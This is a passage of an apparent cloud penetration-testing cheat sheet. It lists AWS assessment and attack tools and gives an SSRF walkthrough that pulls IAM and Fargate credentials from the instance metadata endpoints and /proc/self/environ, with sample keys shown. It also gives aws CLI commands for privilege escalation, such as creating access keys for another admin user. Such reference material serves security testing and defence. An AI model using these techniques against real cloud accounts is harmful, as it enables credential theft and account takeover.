<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="p">$</span> <span class="n">python</span> <span class="n">scout</span><span class="p">.</span><span class="n">py</span> <span class="n">azure</span> <span class="p">-</span><span class="n">-cli</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/nccgroup/s3_objects_check">s3_objects_check</a> - Whitebox evaluation of effective S3 object permissions, to identify publicly accessible files
    <div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="p">$</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">nccgroup</span><span class="p">/</span><span class="n">s3_objects_check</span>
<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="p">$</span> <span class="n">python3</span> <span class="n">-m</span> <span class="n">venv</span> <span class="n">env</span> <span class="p">&amp;&amp;</span> <span class="n">source</span> <span class="n">env</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">activate</span>
<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="p">$</span> <span class="n">pip</span> <span class="n">install</span> <span class="n">-r</span> <span class="n">requirements</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="p">$</span> <span class="n">python</span> <span class="n">s3-objects-check</span><span class="p">.</span><span class="n">py</span> <span class="n">-h</span>
<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="p">$</span> <span class="n">python</span> <span class="n">s3-objects-check</span><span class="p">.</span><span class="n">py</span> <span class="n">-p</span> <span class="n">whitebox-profile</span> <span class="n">-e</span> <span class="n">blackbox-profile</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/salesforce/cloudsplaining">cloudsplaining</a> - An AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized report
    <div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="p">$</span> <span class="n">pip3</span> <span class="n">install</span> <span class="p">-</span><span class="n">-user</span> <span class="n">cloudsplaining</span>
<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="p">$</span> <span class="n">cloudsplaining</span> <span class="n">download</span> <span class="p">-</span><span class="n">-profile</span> <span class="n">myawsprofile</span>
<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="p">$</span> <span class="n">cloudsplaining</span> <span class="n">scan</span> <span class="p">-</span><span class="n">-input</span><span class="o">-file</span> <span class="k">default</span><span class="p">.</span><span class="n">json</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/carnal0wnage/weirdAAL/wiki">weirdAAL</a> - AWS Attack Library
    <div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">python3</span> <span class="n">weirdAAL</span><span class="p">.</span><span class="n">py</span> <span class="n">-m</span> <span class="n">ec2_describe_instances</span> <span class="n">-t</span> <span class="n">demo</span>
<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="n">python3</span> <span class="n">weirdAAL</span><span class="p">.</span><span class="n">py</span> <span class="n">-m</span> <span class="n">lambda_get_account_settings</span> <span class="n">-t</span> <span class="n">demo</span>
<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="n">python3</span> <span class="n">weirdAAL</span><span class="p">.</span><span class="n">py</span> <span class="n">-m</span> <span class="n">lambda_get_function</span> <span class="n">-a</span> <span class="s1">&#39;MY_LAMBDA_FUNCTION&#39;</span><span class="p">,</span><span class="s1">&#39;us-west-2&#39;</span> <span class="n">-t</span> <span class="n">yolo</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/duo-labs/cloudmapper.git">cloudmapper</a> - CloudMapper helps you analyze your Amazon Web Services (AWS) environments
    <div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">duo-labs</span><span class="p">/</span><span class="n">cloudmapper</span><span class="p">.</span><span class="n">git</span>
<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="c"># sudo yum install autoconf automake libtool python3-devel.x86_64 python3-tkinter python-pip jq awscli</span>
<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="c"># You may additionally need &quot;build-essential&quot;</span>
<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="n">sudo</span> <span class="n">apt-get</span> <span class="n">install</span> <span class="n">autoconf</span> <span class="n">automake</span> <span class="n">libtool</span> <span class="n">python3</span><span class="p">.</span><span class="n">7-dev</span> <span class="n">python3-tk</span> <span class="n">jq</span> <span class="n">awscli</span>
<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="n">pipenv</span> <span class="n">install</span> <span class="p">-</span><span class="n">-skip-lock</span>
<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="n">pipenv</span> <span class="n">shell</span>
<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="n">report</span><span class="p">:</span> <span class="n">Generate</span> <span class="n">HTML</span> <span class="n">report</span><span class="p">.</span> <span class="n">Includes</span> <span class="n">summary</span> <span class="n">of</span> <span class="n">the</span> <span class="n">accounts</span> <span class="n">and</span> <span class="n">audit</span> <span class="n">findings</span><span class="p">.</span>
<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="n">iam_report</span><span class="p">:</span> <span class="n">Generate</span> <span class="n">HTML</span> <span class="n">report</span> <span class="k">for</span> <span class="n">the</span> <span class="n">IAM</span> <span class="n">information</span> <span class="n">of</span> <span class="n">an</span> <span class="n">account</span><span class="p">.</span>
<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="n">audit</span><span class="p">:</span> <span class="n">Check</span> <span class="k">for</span> <span class="n">potential</span> <span class="n">misconfigurations</span><span class="p">.</span>
<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="n">collect</span><span class="p">:</span> <span class="n">Collect</span> <span class="n">metadata</span> <span class="n">about</span> <span class="n">an</span> <span class="n">account</span><span class="p">.</span>
<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="n">find_admins</span><span class="p">:</span> <span class="n">Look</span> <span class="n">at</span> <span class="n">IAM</span> <span class="n">policies</span> <span class="n">to</span> <span class="n">identify</span> <span class="n">admin</span> <span class="n">users</span> <span class="n">and</span> <span class="n">roles</span><span class="p">,</span> <span class="n">or</span> <span class="n">principals</span> <span class="n">with</span> <span class="n">specific</span> <span class="n">privileges</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://labs.bishopfox.com/dufflebag">dufflebag</a> - Find secrets that are accidentally exposed via Amazon EBS's "public" mode</p>
</li>
<li><a href="https://github.com/NetSPI/aws_consoler">NetSPI/AWS Consoler</a> - Convert AWS Credentials into a console access</li>
</ul>
<h2 id="aws-patterns">AWS Patterns</h2>
<table>
<thead>
<tr>
<th>Service</th>
<th>URL</th>
</tr>
</thead>
<tbody>
<tr>
<td>s3</td>
<td>https://{user_provided}.s3.amazonaws.com</td>
</tr>
<tr>
<td>cloudfront</td>
<td>https://{random_id}.cloudfront.net</td>
</tr>
<tr>
<td>ec2</td>
<td>ec2-{ip-seperated}.compute-1.amazonaws.com</td>
</tr>
<tr>
<td>es</td>
<td>https://{user_provided}-{random_id}.{region}.es.amazonaws.com</td>
</tr>
<tr>
<td>elb</td>
<td>http://{user_provided}-{random_id}.{region}.elb.amazonaws.com:80/443</td>
</tr>
<tr>
<td>elbv2</td>
<td>https://{user_provided}-{random_id}.{region}.elb.amazonaws.com</td>
</tr>
<tr>
<td>rds</td>
<td>mysql://{user_provided}.{random_id}.{region}.rds.amazonaws.com:3306</td>
</tr>
<tr>
<td>rds</td>
<td>postgres://{user_provided}.{random_id}.{region}.rds.amazonaws.com:5432</td>
</tr>
<tr>
<td>route 53</td>
<td>{user_provided}</td>
</tr>
<tr>
<td>execute-api</td>
<td>https://{random_id}.execute-api.{region}.amazonaws.com/{user_provided}</td>
</tr>
<tr>
<td>cloudsearch</td>
<td>https://doc-{user_provided}-{random_id}.{region}.cloudsearch.amazonaws.com</td>
</tr>
<tr>
<td>transfer</td>
<td>sftp://s-{random_id}.server.transfer.{region}.amazonaws.com</td>
</tr>
<tr>
<td>iot</td>
<td>mqtt://{random_id}.iot.{region}.amazonaws.com:8883</td>
</tr>
<tr>
<td>iot</td>
<td>https://{random_id}.iot.{region}.amazonaws.com:8443</td>
</tr>
<tr>
<td>iot</td>
<td>https://{random_id}.iot.{region}.amazonaws.com:443</td>
</tr>
<tr>
<td>mq</td>
<td>https://b-{random_id}-{1,2}.mq.{region}.amazonaws.com:8162</td>
</tr>
<tr>
<td>mq</td>
<td>ssl://b-{random_id}-{1,2}.mq.{region}.amazonaws.com:61617</td>
</tr>
<tr>
<td>kafka</td>
<td>b-{1,2,3,4}.{user_provided}.{random_id}.c{1,2}.kafka.{region}.amazonaws.com</td>
</tr>
<tr>
<td>kafka</td>
<td>{user_provided}.{random_id}.c{1,2}.kafka.useast-1.amazonaws.com</td>
</tr>
<tr>
<td>cloud9</td>
<td>https://{random_id}.vfs.cloud9.{region}.amazonaws.com</td>
</tr>
<tr>
<td>mediastore</td>
<td>https://{random_id}.data.mediastore.{region}.amazonaws.com</td>
</tr>
<tr>
<td>kinesisvideo</td>
<td>https://{random_id}.kinesisvideo.{region}.amazonaws.com</td>
</tr>
<tr>
<td>mediaconvert</td>
<td>https://{random_id}.mediaconvert.{region}.amazonaws.com</td>
</tr>
<tr>
<td>mediapackage</td>
<td>https://{random_id}.mediapackage.{region}.amazonaws.com/in/v1/{random_id}/channel</td>
</tr>
</tbody>
</table>
<h2 id="aws-metadata-ssrf">AWS - Metadata SSRF</h2>
<blockquote>
<p>AWS released additional security defences against the attack.</p>
</blockquote>
<p><img alt="" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> Only working with IMDSv1.
Enabling IMDSv2 : <code>aws ec2 modify-instance-metadata-options --instance-id &lt;INSTANCE-ID&gt; --profile &lt;AWS_PROFILE&gt; --http-endpoint enabled --http-token required</code>.</p>
<p>In order to usr IMDSv2 you must provide a token.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">export</span> <span class="n">TOKEN</span><span class="p">=`</span><span class="nb">curl </span><span class="n">-X</span> <span class="n">PUT</span> <span class="n">-H</span> <span class="s2">&quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot;</span> <span class="s2">&quot;http://169.254.169.254/latest/api/token&quot;</span><span class="p">`</span>
<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="nb">curl </span><span class="n">-H</span> <span class="s2">&quot;X-aws-ec2-metadata-token:$TOKEN&quot;</span> <span class="n">-v</span> <span class="s2">&quot;http://169.254.169.254/latest/meta-data&quot;</span>
</code></pre></div>
<h3 id="method-for-elastic-cloud-compute-ec2">Method for Elastic Cloud Compute (EC2)</h3>
<p>Example : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/</p>
<ol>
<li>Access the IAM : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/
    <div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">ami-id</span>
<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="n">ami-launch-index</span>
<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="n">ami-manifest-path</span>
<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="nb">block-device</span><span class="n">-mapping</span><span class="p">/</span>
<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="n">events</span><span class="p">/</span>
<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="n">hostname</span>
<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="n">iam</span><span class="p">/</span>
<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="n">identity-credentials</span><span class="p">/</span>
<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="n">instance-action</span>
<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="n">instance-id</span>
</code></pre></div></li>
<li>Find the name of the role assigned to the instance : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/</li>
<li>Extract the role's temporary keys : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/
    <div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">{</span>
<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="s2">&quot;Code&quot;</span> <span class="p">:</span> <span class="s2">&quot;Success&quot;</span><span class="p">,</span>
<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="s2">&quot;LastUpdated&quot;</span> <span class="p">:</span> <span class="s2">&quot;2019-07-31T23:08:10Z&quot;</span><span class="p">,</span>
<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="s2">&quot;Type&quot;</span> <span class="p">:</span> <span class="s2">&quot;AWS-HMAC&quot;</span><span class="p">,</span>
<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="s2">&quot;AccessKeyId&quot;</span> <span class="p">:</span> <span class="s2">&quot;ASIA54BL6PJR37YOEP67&quot;</span><span class="p">,</span>
<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="s2">&quot;SecretAccessKey&quot;</span> <span class="p">:</span> <span class="s2">&quot;OiAjgcjm1oi2xxxxxxxxOEXkhOMhCOtJMP2&quot;</span><span class="p">,</span>
<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="s2">&quot;Token&quot;</span> <span class="p">:</span> <span class="s2">&quot;AgoJb3JpZ2luX2VjEDU86Rcfd/34E4rtgk8iKuTqwrRfOppiMnv&quot;</span><span class="p">,</span>
<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="s2">&quot;Expiration&quot;</span> <span class="p">:</span> <span class="s2">&quot;2019-08-01T05:20:30Z&quot;</span>
<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="p">}</span>
</code></pre></div></li>
</ol>
<h3 id="method-for-container-service-fargate">Method for Container Service (Fargate)</h3>
<ol>
<li>Fetch the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI variable from https://awesomeapp.com/download?file=/proc/self/environ
    <div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="n">JAVA_ALPINE_VERSION</span><span class="p">=</span><span class="n">8</span><span class="p">.</span><span class="n">212</span><span class="p">.</span><span class="n">04-r0</span>
<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="n">HOSTNAME</span><span class="p">=</span><span class="n">bbb3c57a0ed3SHLVL</span><span class="p">=</span><span class="n">1PORT</span><span class="p">=</span><span class="n">8443HOME</span><span class="p">=/</span><span class="n">root</span>
<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="n">AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</span><span class="p">=/</span><span class="n">v2</span><span class="p">/</span><span class="n">credentials</span><span class="p">/</span><span class="n">d22070e0</span><span class="p">-</span><span class="n">5f22</span><span class="p">-</span><span class="n">4987-ae90</span><span class="p">-</span><span class="n">1cd9bec3f447</span>
<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="n">AWS_EXECUTION_ENV</span><span class="p">=</span><span class="n">AWS_ECS_FARGATEMVN_VER</span><span class="p">=</span><span class="n">3</span><span class="p">.</span><span class="n">3</span><span class="p">.</span><span class="n">9JAVA_VERSION</span><span class="p">=</span><span class="n">8u212AWS_DEFAULT_REGION</span><span class="p">=</span><span class="n">us-west</span><span class="p">-</span><span class="n">2</span>
<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="n">ECS_CONTAINER_METADATA_URI</span><span class="p">=</span><span class="n">http</span><span class="p">://</span><span class="n">169</span><span class="p">.</span><span class="n">254</span><span class="p">.</span><span class="n">170</span><span class="p">.</span><span class="n">2</span><span class="p">/</span><span class="n">v3</span><span class="p">/</span><span class="n">cb4f6285</span><span class="p">-</span><span class="n">48f2</span><span class="p">-</span><span class="n">4a51-a787</span><span class="p">-</span><span class="n">67dbe61c13ffPATH</span><span class="p">=/</span><span class="n">usr</span><span class="p">/</span><span class="n">local</span><span class="p">/</span><span class="n">sbin</span><span class="p">:/</span><span class="n">usr</span><span class="p">/</span><span class="n">local</span><span class="p">/</span><span class="n">bin</span><span class="p">:/</span><span class="n">usr</span><span class="p">/</span><span class="n">sbin</span><span class="p">:/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">:/</span><span class="n">sbin</span><span class="p">:/</span><span class="n">bin</span><span class="p">:/</span><span class="n">usr</span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">jvm</span><span class="p">/</span><span class="n">java</span><span class="p">-</span><span class="n">1</span><span class="p">.</span><span class="n">8-openjdk</span><span class="p">/</span><span class="n">jre</span><span class="p">/</span><span class="n">bin</span><span class="p">:/</span><span class="n">usr</span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">jvm</span><span class="p">/</span><span class="n">java</span><span class="p">-</span><span class="n">1</span><span class="p">.</span><span class="n">8-openjdk</span><span class="p">/</span><span class="n">bin</span><span class="p">:/</span><span class="n">usr</span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">mvn</span><span class="p">:/</span><span class="n">usr</span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">mvn</span><span class="p">/</span><span class="n">binLANG</span><span class="p">=</span><span class="n">C</span><span class="p">.</span><span class="n">UTF</span><span class="p">-</span><span class="n">8AWS_REGION</span><span class="p">=</span><span class="n">us-west</span><span class="p">-</span><span class="n">2Tag</span><span class="p">=</span><span class="n">48111bbJAVA_HOME</span><span class="p">=/</span><span class="n">usr</span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">jvm</span><span class="p">/</span><span class="n">java</span><span class="p">-</span><span class="n">1</span><span class="p">.</span><span class="n">8-openjdk</span><span class="p">/</span><span class="n">jreM2</span><span class="p">=/</span><span class="n">usr</span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">mvn</span><span class="p">/</span><span class="n">binPWD</span><span class="p">=/</span><span class="n">appM2_HOME</span><span class="p">=/</span><span class="n">usr</span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">mvnLD_LIBRARY_PATH</span><span class="p">=/</span><span class="n">usr</span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">jvm</span><span class="p">/</span><span class="n">java</span><span class="p">-</span><span class="n">1</span><span class="p">.</span><span class="n">8-openjdk</span><span class="p">/</span><span class="n">jre</span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">amd64</span><span class="p">/</span><span class="n">server</span><span class="p">:/</span><span class="n">usr</span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">jvm</span><span class="p">/</span><span class="n">java</span><span class="p">-</span><span class="n">1</span><span class="p">.</span><span class="n">8-openjdk</span><span class="p">/</span><span class="n">jre</span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">amd64</span><span class="p">:/</span><span class="n">usr</span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">jvm</span><span class="p">/</span><span class="n">java</span><span class="p">-</span><span class="n">1</span><span class="p">.</span><span class="n">8-openjd</span>
</code></pre></div></li>
<li>Use the credential URL to dump the AccessKey and SecretKey : https://awesomeapp.com/forward?target=http://169.254.170.2/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447
    <div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="p">{</span>
<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>    <span class="s2">&quot;RoleArn&quot;</span><span class="p">:</span> <span class="s2">&quot;arn:aws:iam::953574914659:role/awesome-waf-role&quot;</span><span class="p">,</span>
<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>    <span class="s2">&quot;AccessKeyId&quot;</span><span class="p">:</span> <span class="s2">&quot;ASIA54BL6PJR2L75XHVS&quot;</span><span class="p">,</span>
<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>    <span class="s2">&quot;SecretAccessKey&quot;</span><span class="p">:</span> <span class="s2">&quot;j72eTy+WHgIbO6zpe2DnfjEhbObuTBKcemfrIygt&quot;</span><span class="p">,</span>
<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>    <span class="s2">&quot;Token&quot;</span><span class="p">:</span> <span class="s2">&quot;FQoGZXIvYXdzEMj//////////wEaDEQW+wwBtaoyqH5lNSLGBF3PnwnLYa3ggfKBtLMoWCEyYklw6YX85koqNwKMYrP6ymcjv4X2gF5enPi9/Dx6m/1TTFIwMzZ3tf4V3rWP3HDt1ea6oygzTrWLvfdp57sKj+2ccXI+WWPDZh3eJr4Wt4JkiiXrWANn7Bx3BUj9ZM11RXrKRCvhrxdrMLoewRkWmErNEOFgbaCaT8WeOkzqli4f+Q36ZerT2V+FJ4SWDX1CBsimnDAMAdTIRSLFxVBBwW8171OHiBOYAMK2np1xAW1d3UCcZcGKKZTjBee2zs5+Rf5Nfkoq+j7GQkmD2PwCeAf0RFETB5EVePNtlBWpzfOOVBtsTUTFewFfx5cyNsitD3C2N93WR59LX/rNxyncHGDUP/6UPlasOcfzAaG738OJQmWfQTR0qksHIc2qiPtkstnNndh76is+r+Jc4q3wOWu2U2UBi44Hj+OS2UTpMAwc/MshIiGsUOrBQdPqcLLdAxKpUNTdSQNLg5wv4f2OrOI8/sneV58yBRolBz8DZoH8wohtLXpueDt8jsVSVLznnMOOe/4ehHE2Nt+Fy+tjaY5FUi/Ijdd5IrIdIvWFHY1XcPopUFYrDqr0yuZvX1YddfIcfdbmxf274v69FuuywXTo7cXk1QTMYZWlD/dPI/k6KQeO446UrHT9BJxcJMpchAIVRpI7nVKkSDwku1joKUG7DOeycuAbhecVZG825TocL0ks2yXPnIdvckAaU9DZf+afIV3Nxv3TI4sSX1npBhb2f/8C31pv8VHyu2NiN5V6OOHzZijHsYXsBQ==&quot;</span><span class="p">,</span>
<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>    <span class="s2">&quot;Expiration&quot;</span><span class="p">:</span> <span class="s2">&quot;2019-09-18T04:05:59Z&quot;</span>
<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="p">}</span>
</code></pre></div></li>
</ol>
<h3 id="aws-api-calls-that-return-credentials">AWS API calls that return credentials</h3>
<ul>
<li>chime:createapikey</li>
<li><a href="https://docs.aws.amazon.com/codepipeline/latest/APIReference/API_PollForJobs.html">codepipeline:pollforjobs</a></li>
<li><a href="https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_GetOpenIdToken.html">cognito-identity:getopenidtoken</a></li>
<li><a href="https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_GetOpenIdTokenForDeveloperIdentity.html">cognito-identity:getopenidtokenfordeveloperidentity</a></li>
<li><a href="https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_GetCredentialsForIdentity.html">cognito-identity:getcredentialsforidentity</a></li>
<li><a href="https://docs.aws.amazon.com/connect/latest/APIReference/API_GetFederationToken.html">connect:getfederationtoken</a></li>
<li><a href="https://docs.aws.amazon.com/connect/latest/APIReference/API_GetFederationToken.html">connect:getfederationtokens</a></li>
<li><a href="https://docs.aws.amazon.com/AmazonECR/latest/APIReference/API_GetAuthorizationToken.html">ecr:getauthorizationtoken</a></li>
<li><a href="https://docs.aws.amazon.com/gamelift/latest/apireference/API_RequestUploadCredentials.html">gamelift:requestuploadcredentials</a></li>
<li><a href="https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateAccessKey.html">iam:createaccesskey</a></li>
<li><a href="https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateLoginProfile.html">iam:createloginprofile</a></li>
<li><a href="https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateServiceSpecificCredential.html">iam:createservicespecificcredential</a></li>
<li><a href="https://docs.aws.amazon.com/IAM/latest/APIReference/API_ResetServiceSpecificCredential.html">iam:resetservicespecificcredential</a></li>
<li><a href="https://docs.aws.amazon.com/IAM/latest/APIReference/API_UpdateAccessKey.html">iam:updateaccesskey</a></li>
<li><a href="https://docs.aws.amazon.com/lightsail/2016-11-28/api-reference/API_GetInstanceAccessDetails.html">lightsail:getinstanceaccessdetails</a></li>
<li><a href="https://docs.aws.amazon.com/lightsail/2016-11-28/api-reference/API_GetRelationalDatabaseMasterUserPassword.html">lightsail:getrelationaldatabasemasteruserpassword</a></li>
<li><a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.IAMDBAuth.IAMPolicy.html">rds-db:connect</a></li>
<li><a href="https://docs.aws.amazon.com/redshift/latest/APIReference/API_GetClusterCredentials.html">redshift:getclustercredentials</a></li>
<li><a href="https://docs.aws.amazon.com/singlesignon/latest/PortalAPIReference/API_GetRoleCredentials.html">sso:getrolecredentials</a></li>
<li><a href="https://docs.aws.amazon.com/mediapackage/latest/apireference/channels-id-credentials.html">mediapackage:rotatechannelcredentials</a></li>
<li><a href="https://docs.aws.amazon.com/mediapackage/latest/apireference/channels-id-ingest_endpoints-ingest_endpoint_id-credentials.html">mediapackage:rotateingestendpointcredentials</a></li>
<li><a href="https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role.html">sts:assumerole</a></li>
<li><a href="https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-saml.html">sts:assumerolewithsaml</a></li>
<li><a href="https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-web-identity.html">sts:assumerolewithwebidentity</a></li>
<li><a href="https://docs.aws.amazon.com/cli/latest/reference/sts/get-federation-token.html">sts:getfederationtoken</a></li>
<li><a href="https://docs.aws.amazon.com/cli/latest/reference/sts/get-session-token.html">sts:getsessiontoken</a></li>
</ul>
<h2 id="aws-shadow-admin">AWS - Shadow Admin</h2>
<h3 id="admin-equivalent-permission">Admin equivalent permission</h3>
<ul>
<li>
<p>AdministratorAccess</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="s2">&quot;Action&quot;</span><span class="p">:</span> <span class="s2">&quot;*&quot;</span>
<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="s2">&quot;Resource&quot;</span><span class="p">:</span> <span class="s2">&quot;*&quot;</span>
</code></pre></div>
</li>
<li>
<p><strong>ec2:AssociateIamInstanceProfile</strong> : attach an IAM instance profile to an EC2 instance
    <div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">aws</span> <span class="n">ec2</span> <span class="n">associate-iam-instance-profile</span> <span class="p">-</span><span class="n">-iam-instance-profile</span> <span class="n">Name</span><span class="p">=</span><span class="n">admin-role</span> <span class="p">-</span><span class="n">-instance-id</span> <span class="n">i</span><span class="p">-</span><span class="n">0123456789</span>
</code></pre></div></p>
</li>
<li>
<p><strong>iam:CreateAccessKey</strong> : create a new access key to another IAM admin account
    <div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">aws</span> <span class="n">iam</span> <span class="n">create-access-key</span> <span class="err"></span><span class="n">user-name</span> <span class="n">target_user</span>
</code></pre></div></p>
</li>
<li>
<p><strong>iam:CreateLoginProfile</strong> : add a new password-based login profile, set a new password for an entity and impersonate it 
